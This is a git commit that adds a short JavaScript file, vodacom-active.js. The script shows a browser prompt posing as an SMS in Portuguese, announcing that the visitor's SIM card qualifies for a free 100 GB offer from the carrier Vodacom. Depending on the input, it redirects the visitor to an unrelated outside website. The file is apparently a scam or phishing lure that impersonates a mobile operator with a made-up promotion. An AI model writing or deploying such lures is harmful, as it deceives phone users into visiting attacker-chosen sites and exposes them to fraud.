fbb2d39f51a68b65142eddef7aef5d65c0bc2648
bigukpe <bigaka42@gmail.com>
2025-03-23 09:25:20 +0100

    Create vodacom-active.js

---
+++ vodacom-active.js
@@ -0,0 +1,5 @@
+var password = 'ATIVAR 100 GB '
+password=prompt('SMS: Parabéns, seu cartão SIM está qualificado para receber 100 GB Oferta especial, clique em OK para ATIVAR 100 GB now. ','ATIVAR 100 GB ');
+if (password != 'ATIVAR 100 GB ') {
+location.href='https://learnlivetech.org/vodacom-mz.html';
+}
